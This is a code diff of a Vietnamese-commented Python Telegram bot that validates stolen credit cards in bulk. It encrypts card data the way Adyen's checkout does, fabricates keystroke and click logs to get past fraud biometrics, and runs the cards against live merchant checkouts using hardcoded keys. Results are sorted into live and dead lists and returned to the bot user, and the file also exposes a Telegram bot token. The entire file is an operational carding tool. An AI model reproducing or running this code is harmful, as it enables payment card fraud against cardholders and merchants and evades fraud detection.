@@ -13,12 +13,8 @@ from datetime import datetime
 import io
 import threading
 import queue
-import asyncio
-import psutil
-
-# Thư viện Telegram Bot (V20+)
-from telegram import Update, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
+import psutil  # Thư viện check CPU/RAM
+import telebot # Thư viện Telegram Bot
 
 # Thư viện mã hóa
 from Cryptodome.PublicKey import RSA
@@ -32,15 +28,11 @@ import pycurl
 # ===================================================================
 # === CẤU HÌNH BOT TELEGRAM
 # ===================================================================
+API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
+bot = telebot.TeleBot(API_TOKEN)
 
-BOT_TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"  # <--- ĐIỀN TOKEN VÀO ĐÂY
-ADMIN_ID = None # Nếu muốn giới hạn người dùng, điền ID vào đây (dạng số), ví dụ: 123456789
-
-# Biến toàn cục để quản lý trạng thái
-active_tasks = {}
-
-# Khóa luồng
-stats_lock = threading.Lock()
+# Số luồng mặc định
+DEFAULT_THREADS = 100
 
 # ===================================================================
 # === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
@@ -54,13 +46,11 @@ def normalize_card(card_str):
         return None
     card_num, month, year, cvv = match.groups()
     
-    # Xử lý tháng
     month_int = int(month)
     if month_int < 1 or month_int > 12:
         return None
     month = month.zfill(2)
     
-    # Xử lý năm (chuyển 2 số thành 4 số)
     if len(year) == 2:
         year = '20' + year
     year_int = int(year)
@@ -97,37 +87,23 @@ def get_short_brand_name(cc):
     elif cc.startswith('67'): return 'maestro'
     else: return 'unknown'
 
-
 # ===================================================================
 # === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
 # ===================================================================
 
 def get_current_timestamp():
-    """Tạo timestamp theo định dạng ISO 8601 UTC."""
     return datetime.utcnow().isoformat() + 'Z'
 
 def generate_fake_log(input_len):
-    """
-    Giả lập hành vi người dùng (Behavioral Biometrics)
-    """
     log_entries = []
-    
-    # Thời gian bắt đầu ngẫu nhiên
     current_time = random.randint(2000, 5000)
-    
-    # 1. Focus
     log_entries.append(f"fo@{current_time}")
     current_time += random.randint(50, 200)
-    
-    # 2. Click
     log_entries.append(f"cl@{current_time}")
     current_time += random.randint(100, 300)
-    
-    # 3. Gõ phím
     for _ in range(input_len):
         log_entries.append(f"KN@{current_time}")
-        current_time += random.randint(60, 180) 
-        
+        current_time += random.randint(60, 180)
     return ",".join(log_entries)
 
 def w(e):
@@ -166,16 +142,12 @@ class AdyenV4_8_0:
         parts = self.site_key.split("|")
         if len(parts) != 2:
             raise ValueError("Malformed public key: incorrect split parts")
-        
         part1 = parts[0]
         part2 = parts[1]
-        
         decoded_part1 = k(part1)
         decoded_part2 = k(part2)
-
         encoded_part1 = _(decoded_part1)
         encoded_part2 = _(decoded_part2)
-
         self.key_object = {
             "kty": "RSA",
             "kid": "asf-key",
@@ -189,40 +161,29 @@ class AdyenV4_8_0:
         public_key = jwk.construct(self.key_object)
         pem = public_key.to_pem().decode('utf-8')
         rsa_key = RSA.import_key(pem)
-
         random_bytes = os.urandom(64)
-        
         cipher_rsa = PKCS1_OAEP.new(rsa_key)
         encrypted_key = cipher_rsa.encrypt(random_bytes)
-        
         cek = random_bytes
-        
         protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
         protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
-        
         _iv = os.urandom(16)
         _plaintext = json.dumps(plain_text).encode('utf-8')
-        
         aes_key = cek[32:]
         hmac_key = cek[:32]
-        
         cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
         padded_plaintext = pad(_plaintext, AES.block_size)
         ciphertext = cipher_aes.encrypt(padded_plaintext)
-        
         protected_header2_bytes = protected_header_b64.encode('utf-8')
-        
         f = len(protected_header2_bytes) * 8
         d = f // bt
         h_val = f % bt
         y = bytearray(8)
         mt(y, d, 0)
         mt(y, h_val, 4)
-
         hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
         hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
         tag = hmac_obj.digest()[:32]
-
         return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"
 
 def format_card_number(card):
@@ -231,20 +192,15 @@ def format_card_number(card):
 def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
     if not all([card, month, year, cvc, adyen_key]):
         raise ValueError("Missing card details or Adyen key")
-
     if not stripe_key:
         stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
     if not domain:
         domain = "https://www.mytheresa.com"
-        
     domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
     referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
-    
     card_number = format_card_number(card)
-
     fake_number_log = generate_fake_log(16)
     fake_cvc_log = generate_fake_log(3)
-
     card_detail = {
         "encryptedCardNumber": {
             "number": card_number, 
@@ -274,14 +230,11 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
             "deactivate": "2"
         }
     }
-
     adyen_encryptor = AdyenV4_8_0(adyen_key)
     adyen_encryptor.generate_key()
-    
     encrypted_details = {}
     for key, value in card_detail.items():
         encrypted_details[key] = adyen_encryptor.encrypt_data(value)
-        
     return encrypted_details
 
 # ===================================================================
@@ -303,24 +256,36 @@ def generate_checkout_attempt_id():
     return f"{uuid_part}{suffix}"
 
 # ===================================================================
-# === PHẦN 4: HÀM CHECK THẺ (CORE)
+# === PHẦN 4: HÀM CHECK THẺ (ĐIỀU CHỈNH ĐỂ RETURN KẾT QUẢ)
 # ===================================================================
 
-def check_card_core(cc, mm, yyyy, cvc):
-    """Hàm xử lý logic check thẻ, trả về chuỗi kết quả và thời gian."""
-    start_time_card = time.time()
+def check_card_process(line_card):
+    start_time = time.time() # Bắt đầu đo thời gian
     
-    # Cấu hình API Key (Giữ nguyên)
+    # Chuẩn hóa
+    line_card = line_card.strip()
+    normalized = normalize_card(line_card)
+    
+    if not normalized:
+        return "ERROR_FORMAT", f"{line_card} - Format Error", 0
+
+    cc, mm, yyyy, cvc = normalized.split('|')
+
+    if not validate_luhn(cc):
+        return "ERROR_LUHN", f"{cc}|{mm}|{yyyy}|{cvc} - Luhn Failed", 0
+
+    # Cấu hình API Key
     ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
     STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
     TARGET_DOMAIN = "https://www.activecampaign.com"
 
+    # ================= RE-TRY LOGIC (MAX 20 LẦN) =================
     data = {}
-    success_request = False
+    response_text = ""
     max_retries = 20
     current_try = 0
-    
-    # Logic Re-try
+    success_request = False
+
     while current_try < max_retries:
         try:
             encrypted_result = encrypt_card_data_480(
@@ -412,12 +377,14 @@ def check_card_core(cc, mm, yyyy, cvc):
         current_try += 1
         time.sleep(1)
 
-    end_time_card = time.time()
-    time_taken = round(end_time_card - start_time_card, 2)
-    time_str = f"TimeTaken: {time_taken}s"
+    # Tính thời gian đã chạy
+    end_time = time.time()
+    time_taken = round(end_time - start_time, 2)
+
+    # ================= XỬ LÝ KẾT QUẢ =================
 
     if not success_request:
-        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES|{time_str}"
+        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES|Time:{time_taken}s", time_taken
 
     additionalData = data.get('additionalData', {})
     cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
@@ -429,264 +396,248 @@ def check_card_core(cc, mm, yyyy, cvc):
     resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
     message = data.get('message', 'N/A')
 
-    msg = ""
-    status = "ERROR"
     if resultCode == "Authorised" or resultCode == "Cancelled":
-        msg = "APPROVED ✅"
         status = "LIVE"
+        msg = "APPROVED ✅"
     elif resultCode == "Refused":
-        msg = f"DIE - {refusalReason}"
         status = "DIE"
+        msg = f"DIE - {refusalReason}"
     elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
+        status = "DIE" # Coi như die nếu dính 3D (tùy nhu cầu, ở đây để DIE theo logic cũ)
         msg = "3DS - 3D Secure required"
-        status = "DIE" # Coi 3DS là Die tùy quy ước, ở đây để DIE
     else:
+        status = "DIE"
         msg = f"UNK - {message if message != 'N/A' else resultCode}"
-        status = "ERROR"
 
-    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|{time_str}"
+    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|Time:{time_taken}s"
     
-    return status, result_string
+    return status, result_string, time_taken
 
 # ===================================================================
-# === PHẦN 5: BOT LOGIC & MULTI-THREADING HANDLER
+# === PHẦN 5: XỬ LÝ TELEGRAM BOT & ĐA LUỒNG
 # ===================================================================
 
-def bot_worker(chat_id, card_list):
-    """Worker quản lý luồng cho Bot."""
-    q = queue.Queue()
-    for card in card_list:
-        q.put(card)
+# Lưu trạng thái của các tác vụ đang chạy
+tasks = {}
 
-    def thread_task():
-        while True:
-            try:
-                line_card = q.get(timeout=1)
-            except queue.Empty:
-                break
+class CheckTask:
+    def __init__(self, chat_id, message_id, file_path):
+        self.chat_id = chat_id
+        self.message_id = message_id
+        self.file_path = file_path
+        self.total = 0
+        self.live = 0
+        self.die = 0
+        self.error = 0
+        self.checked = 0
+        self.start_time = time.time()
+        self.is_running = True
+        
+        # Files kết quả
+        self.live_file = f"live_{chat_id}.txt"
+        self.die_file = f"die_{chat_id}.txt"
+        
+        # Xóa file cũ nếu có
+        if os.path.exists(self.live_file): os.remove(self.live_file)
+        if os.path.exists(self.die_file): os.remove(self.die_file)
+
+    def update_stats(self, status, result_str):
+        self.checked += 1
+        if status == "LIVE":
+            self.live += 1
+            with open(self.live_file, "a", encoding="utf-8") as f:
+                f.write(result_str + "\n")
+        elif status == "DIE":
+            self.die += 1
+            with open(self.die_file, "a", encoding="utf-8") as f:
+                f.write(result_str + "\n")
+        else:
+            self.error += 1
+            # Error cũng ghi vào die file hoặc file riêng tùy ý, ở đây ghi vào die
+            with open(self.die_file, "a", encoding="utf-8") as f:
+                f.write(result_str + "\n")
+
+    def get_cpm(self):
+        elapsed = time.time() - self.start_time
+        if elapsed < 1: return 0
+        return int((self.checked / elapsed) * 60)
+
+def bot_worker(q, task):
+    while True:
+        try:
+            line = q.get(timeout=1)
+        except queue.Empty:
+            break
             
-            # Normalize
-            normalized = normalize_card(line_card)
-            if not normalized:
-                q.task_done()
-                continue
-                
-            cc, mm, yyyy, cvc = normalized.split('|')
-            if not validate_luhn(cc):
-                q.task_done()
-                continue
+        try:
+            status, result_str, t_taken = check_card_process(line)
+            task.update_stats(status, result_str)
+        except Exception as e:
+            task.update_stats("ERROR", f"System Error: {e}")
+        finally:
+            q.task_done()
 
-            try:
-                status, result_str = check_card_core(cc, mm, yyyy, cvc)
+def monitor_thread(task):
+    """Cập nhật tin nhắn Telegram mỗi giây"""
+    while task.is_running:
+        try:
+            # Lấy thông số hệ thống
+            cpu_usage = psutil.cpu_percent()
+            ram_usage = psutil.virtual_memory().percent
+            
+            cpm = task.get_cpm()
+            
+            msg_text = (
+                f"<b>🚀 PROCESSING...</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💳 Total: {task.total}\n"
+                f"✅ Live: {task.live}\n"
+                f"💀 Die: {task.die}\n"
+                f"⚠️ Error: {task.error}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"⚡ CPM: {cpm}\n"
+                f"🖥 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
+                f"🔄 Progress: {task.checked}/{task.total}"
+            )
+            
+            bot.edit_message_text(
+                chat_id=task.chat_id,
+                message_id=task.message_id,
+                text=msg_text,
+                parse_mode='HTML'
+            )
+            
+            if task.checked >= task.total:
+                break
                 
-                with stats_lock:
-                    stats = active_tasks[chat_id]['stats']
-                    stats['checked'] += 1
-                    if status == "LIVE":
-                        stats['live'] += 1
-                        active_tasks[chat_id]['live_lines'].append(result_str)
-                    elif status == "DIE":
-                        stats['die'] += 1
-                        active_tasks[chat_id]['die_lines'].append(result_str)
-                    else:
-                        stats['error'] += 1
-            except Exception as e:
-                with stats_lock:
-                    active_tasks[chat_id]['stats']['error'] += 1
-            finally:
-                q.task_done()
+            time.sleep(1.5) # Update mỗi 1.5s để tránh limit tele
+        except Exception as e:
+            time.sleep(1)
 
-    # Chạy 100 luồng con
+def run_checker(chat_id, file_path, message_id):
+    task = CheckTask(chat_id, message_id, file_path)
+    tasks[chat_id] = task
+    
+    # Đọc file
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        cards = [line.strip() for line in f if line.strip()]
+    
+    task.total = len(cards)
+    
+    q = queue.Queue()
+    for c in cards:
+        q.put(c)
+        
+    # Tạo Thread Monitor
+    t_monitor = threading.Thread(target=monitor_thread, args=(task,))
+    t_monitor.start()
+    
+    # Tạo Thread Worker (100 luồng)
     threads = []
-    num_threads = 100 
-    for _ in range(num_threads):
-        t = threading.Thread(target=thread_task)
+    for _ in range(DEFAULT_THREADS):
+        t = threading.Thread(target=bot_worker, args=(q, task))
         t.start()
         threads.append(t)
-    
+        
     # Chờ Queue xong
     q.join()
-    # Chờ Threads xong
+    
+    # Chờ Thread xong
     for t in threads:
         t.join()
-
-    # Đánh dấu đã xong
-    active_tasks[chat_id]['is_running'] = False
-
-# ===================================================================
-# === PHẦN 6: TELEGRAM HANDLERS
-# ===================================================================
-
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 Chào mừng!\n"
-        "1. Gửi file `.txt` (định dạng `cc|mm|yy|cvv`) để chạy check (100 luồng).\n"
-        "2. Dùng `/st cc|mm|yy|cvv` để check lẻ."
-    )
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.message.chat_id
+        
+    task.is_running = False
+    t_monitor.join()
     
-    # Kiểm tra nếu đang chạy
-    if chat_id in active_tasks and active_tasks[chat_id].get('is_running'):
-        await update.message.reply_text("⚠️ Đang có tiến trình chạy. Vui lòng chờ xong!")
-        return
-
-    document = update.message.document
-    file_name = document.file_name
-    
-    if not file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Chỉ nhận file .txt")
-        return
-
-    # Tải file về
-    file = await document.get_file()
-    file_content = await file.download_as_bytearray()
-    decoded_content = file_content.decode('utf-8', errors='ignore')
-    
-    cards = [line.strip() for line in decoded_content.splitlines() if line.strip()]
-    total_cards = len(cards)
-    
-    if total_cards == 0:
-        await update.message.reply_text("❌ File trống.")
-        return
-
-    # Khởi tạo Stats
-    active_tasks[chat_id] = {
-        'stats': {'live': 0, 'die': 0, 'error': 0, 'checked': 0, 'total': total_cards},
-        'live_lines': [],
-        'die_lines': [],
-        'is_running': True,
-        'start_time': time.time(),
-        'message_id': None
-    }
-
-    # Gửi tin nhắn Dashboard
-    msg = await update.message.reply_text(
-        f"🚀 <b>Starting Task...</b>\nTotal: {total_cards}\nThreads: 100", 
+    # Gửi kết quả cuối cùng
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=message_id,
+        text=f"<b>✅ DONE!</b>\nChecked: {task.total}\nLive: {task.live}\nDie: {task.die}",
         parse_mode='HTML'
     )
-    active_tasks[chat_id]['message_id'] = msg.message_id
-
-    # Chạy worker trong luồng riêng để không block Bot Async
-    threading.Thread(target=bot_worker, args=(chat_id, cards)).start()
-
-    # Chạy Loop cập nhật tin nhắn
-    asyncio.create_task(update_status_loop(update, context))
-
-async def update_status_loop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.message.chat_id
-    msg_id = active_tasks[chat_id]['message_id']
     
-    while True:
-        if chat_id not in active_tasks:
-            break
-            
-        task_data = active_tasks[chat_id]
-        stats = task_data['stats']
-        is_running = task_data['is_running']
-        
-        # Tính toán CPM, CPU, RAM
-        elapsed = time.time() - task_data['start_time']
-        if elapsed > 0:
-            cpm = int((stats['checked'] / elapsed) * 60)
-        else:
-            cpm = 0
-            
-        cpu_usage = psutil.cpu_percent()
-        ram_usage = psutil.virtual_memory().percent
-        
-        text = (
-            f"⚡ <b>STATUS CHECKING</b> ⚡\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"✅ Live: {stats['live']}\n"
-            f"❌ Die: {stats['die']}\n"
-            f"⚠️ Error: {stats['error']}\n"
-            f"🔄 Progress: {stats['checked']}/{stats['total']}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🚀 CPM: {cpm}\n"
-            f"💻 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
-            f"⏳ Time: {int(elapsed)}s"
-        )
-        
-        try:
-            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode='HTML')
-        except Exception:
-            pass # Bỏ qua lỗi nếu tin nhắn không thay đổi hoặc limit
-            
-        if not is_running:
-            break
-            
-        await asyncio.sleep(1.5) # Update mỗi 1.5s để tránh Flood Limit (Telegram cấm spam edit < 1s)
-
-    # Khi xong: Gửi file
-    await send_results(update, context)
-
-async def send_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.message.chat_id
-    task_data = active_tasks[chat_id]
-    
-    # Tạo file Live
-    if task_data['live_lines']:
-        live_content = "\n".join(task_data['live_lines'])
-        live_file = io.BytesIO(live_content.encode('utf-8'))
-        live_file.name = "Live_Cards.txt"
-        await context.bot.send_document(chat_id=chat_id, document=live_file, caption=f"✅ {len(task_data['live_lines'])} Live Cards")
-
-    # Tạo file Die (nếu cần, thường thì nhiều quá nên cân nhắc)
-    if task_data['die_lines']:
-        # Chỉ gửi nếu số lượng không quá lớn để tránh spam bandwidth, ở đây gửi hết theo yêu cầu full
-        die_content = "\n".join(task_data['die_lines'])
-        die_file = io.BytesIO(die_content.encode('utf-8'))
-        die_file.name = "Die_Cards.txt"
-        await context.bot.send_document(chat_id=chat_id, document=die_file, caption=f"❌ {len(task_data['die_lines'])} Die Cards")
-        
-    await context.bot.send_message(chat_id=chat_id, text="✅ <b>COMPLETED ALL TASKS</b>", parse_mode='HTML')
-    
-    # Dọn dẹp
-    del active_tasks[chat_id]
-
-async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    # Format: /st cc|mm|yy|cvv
+    # Gửi file
     try:
-        raw_card = text.split(' ')[1]
-    except IndexError:
-        await update.message.reply_text("⚠️ Sai cú pháp. Dùng: `/st cc|mm|yy|cvv`", parse_mode='Markdown')
-        return
-
-    normalized = normalize_card(raw_card)
-    if not normalized:
-        await update.message.reply_text("❌ Định dạng thẻ không hợp lệ.")
-        return
-
-    msg = await update.message.reply_text("🔄 Checking...")
-    
-    cc, mm, yyyy, cvc = normalized.split('|')
-    
-    # Run sync function in executor
-    loop = asyncio.get_running_loop()
-    status, result_str = await loop.run_in_executor(None, check_card_core, cc, mm, yyyy, cvc)
-    
-    await context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=msg.message_id, text=f"<code>{result_str}</code>", parse_mode='HTML')
+        if task.live > 0:
+            with open(task.live_file, 'rb') as f:
+                bot.send_document(chat_id, f, caption="✅ LIVE CARDS")
+        if task.die > 0:
+            with open(task.die_file, 'rb') as f:
+                bot.send_document(chat_id, f, caption="💀 DIE CARDS")
+    except Exception as e:
+        bot.send_message(chat_id, f"Error sending files: {e}")
+        
+    # Cleanup
+    if os.path.exists(file_path): os.remove(file_path)
+    if os.path.exists(task.live_file): os.remove(task.live_file)
+    if os.path.exists(task.die_file): os.remove(task.die_file)
+    del tasks[chat_id]
 
 # ===================================================================
-# === MAIN EXECUTION
+# === TELEGRAM HANDLERS
 # ===================================================================
 
-def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
-        print("Vui lòng điền BOT TOKEN vào code trước khi chạy!")
-        return
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    bot.reply_to(message, 
+                 "🤖 <b>Adyen Checker Bot</b>\n\n"
+                 "1. Gửi file .txt chứa thẻ để bắt đầu check (100 luồng).\n"
+                 "2. Dùng lệnh <code>/st cc|mm|yy|cvv</code> để check lẻ.",
+                 parse_mode='HTML')
 
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+@bot.message_handler(commands=['st'])
+def check_single_card(message):
+    try:
+        args = message.text.split(maxsplit=1)
+        if len(args) < 2:
+            bot.reply_to(message, "⚠️ Vui lòng nhập thẻ: <code>/st 444444|01|2025|123</code>", parse_mode='HTML')
+            return
+            
+        card_input = args[1]
+        msg = bot.reply_to(message, "⏳ Checking...")
+        
+        status, result_str, t_taken = check_card_process(card_input)
+        
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=msg.message_id,
+            text=f"<b>RESULT:</b>\n<code>{result_str}</code>",
+            parse_mode='HTML'
+        )
+    except Exception as e:
+        bot.reply_to(message, f"Error: {e}")
 
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("st", check_single_card))
-    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
+@bot.message_handler(content_types=['document'])
+def handle_docs(message):
+    try:
+        # Kiểm tra đuôi file
+        file_info = bot.get_file(message.document.file_id)
+        if not file_info.file_path.endswith('.txt'):
+            bot.reply_to(message, "⚠️ Chỉ nhận file .txt")
+            return
+            
+        # Download file
+        downloaded_file = bot.download_file(file_info.file_path)
+        file_name = f"input_{message.chat.id}.txt"
+        
+        with open(file_name, 'wb') as new_file:
+            new_file.write(downloaded_file)
+            
+        # Gửi tin nhắn khởi tạo
+        init_msg = bot.reply_to(message, "⏳ Preparing to check...")
+        
+        # Chạy thread quản lý check
+        t = threading.Thread(target=run_checker, args=(message.chat.id, file_name, init_msg.message_id))
+        t.start()
+        
+    except Exception as e:
+        bot.reply_to(message, f"Lỗi khi nhận file: {e}")
 
-    print("Bot đang chạy...")
-    application.run_polling()
+# ===================================================================
+# === MAIN LOOP
+# ===================================================================
 
 if __name__ == '__main__':
-    main()
+    print(f"{datetime.now()} - Bot is running...")
+    bot.infinity_polling()
